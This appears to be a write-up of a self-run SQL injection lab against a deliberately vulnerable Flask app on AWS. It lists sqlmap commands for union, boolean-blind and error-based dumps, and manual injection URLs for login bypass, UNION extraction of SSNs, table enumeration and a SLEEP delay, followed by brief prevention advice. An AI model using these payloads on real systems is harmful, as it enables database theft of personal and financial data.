# Attack Simulation Summary

## Environment Setup
- Target EC2: 3.144.240.191
- Attacker EC2: 18.221.229.40
- Database: Amazon RDS MySQL
- Database name: userdata
- Vulnerable app hosted on Flask at port 5000

## Vulnerable Application
The Flask web application was deployed on the target EC2 instance and connected to the RDS MySQL database. It exposed two endpoints:
- /login
- /search

The application was vulnerable because it used raw SQL string concatenation.

## Attack 1: Union-Based SQL Injection
Command:
python3 sqlmap.py -u "http://3.144.240.191:5000/search?name=test" --technique=U --dbs --dump --batch -v 3

Result:
Successfully extracted database contents.

Data Exposed:
- full_name
- email
- ssn
- credit_card
- dob

## Attack 2: Boolean-Based Blind SQL Injection
Command:
python3 sqlmap.py -u "http://3.144.240.191:5000/login?username=admin&password=test" --technique=B -D userdata -T users --dump --batch -v 2

Result:
Data inferred using true/false conditions.

## Attack 3: Error-Based SQL Injection
Command:
python3 sqlmap.py -u "http://3.144.240.191:5000/login?username=admin&password=test" --technique=E --dump-all --batch

Result:
Extracted database and table data via error responses.

## Manual Tests

Login Bypass:
http://3.144.240.191:5000/login?username=admin'--&password=x

UNION Extraction:
http://3.144.240.191:5000/search?name=' UNION SELECT id,full_name,ssn FROM users--

Table Enumeration:
http://3.144.240.191:5000/search?name=' UNION SELECT 1,table_name,3 FROM information_schema.tables--

Time Delay:
http://3.144.240.191:5000/login?username=admin' AND SLEEP(5)--&password=x

## Findings
Sensitive user data was exposed due to insecure SQL query construction.

## Risk
- Data leakage
- Identity exposure
- Financial risk

## Prevention
- Parameterized queries
- Input validation
- Secure coding practices
